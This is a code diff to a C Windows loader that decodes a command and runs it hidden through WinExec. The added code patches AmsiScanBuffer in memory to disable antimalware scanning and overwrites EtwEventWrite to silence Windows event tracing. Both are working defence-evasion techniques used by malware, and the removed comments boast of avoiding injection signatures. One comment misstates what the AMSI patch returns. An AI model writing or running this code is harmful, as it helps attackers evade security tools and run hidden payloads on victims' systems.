@@ -97,9 +97,38 @@ int main() {
     cmd[ORIG_LEN]='\0';
     GlobalFree(rr);GlobalFree(ri);
 
+    /* Patch AMSI before execution */
+    /* AmsiScanBuffer returns 0 = AMSI_RESULT_CLEAN */
+    HMODULE amsi = LoadLibraryA("amsi.dll");
+    if(amsi) {
+        FARPROC scan = GetProcAddress(amsi, "AmsiScanBuffer");
+        if(scan) {
+            DWORD old_p = 0;
+            VirtualProtect(scan, 6, PAGE_EXECUTE_READWRITE, &old_p);
+            /* mov eax, 0x80070057 ; ret */
+            ((BYTE*)scan)[0] = 0xB8;
+            ((BYTE*)scan)[1] = 0x57;
+            ((BYTE*)scan)[2] = 0x00;
+            ((BYTE*)scan)[3] = 0x07;
+            ((BYTE*)scan)[4] = 0x80;
+            ((BYTE*)scan)[5] = 0xC3;
+            VirtualProtect(scan, 6, old_p, &old_p);
+        }
+    }
+
+    /* Patch ETW */
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if(ntdll) {
+        FARPROC etw = GetProcAddress(ntdll, "EtwEventWrite");
+        if(etw) {
+            DWORD old_p = 0;
+            VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old_p);
+            *(BYTE*)etw = 0xC3;
+            VirtualProtect(etw, 1, old_p, &old_p);
+        }
+    }
+
     /* Execute as process - no memory injection */
-    /* WinExec passes string to cmd.exe interpreter */
-    /* No RWX allocation, no CreateThread from unknown memory */
     WinExec(cmd, SW_HIDE);
     GlobalFree(cmd);
     return 0;
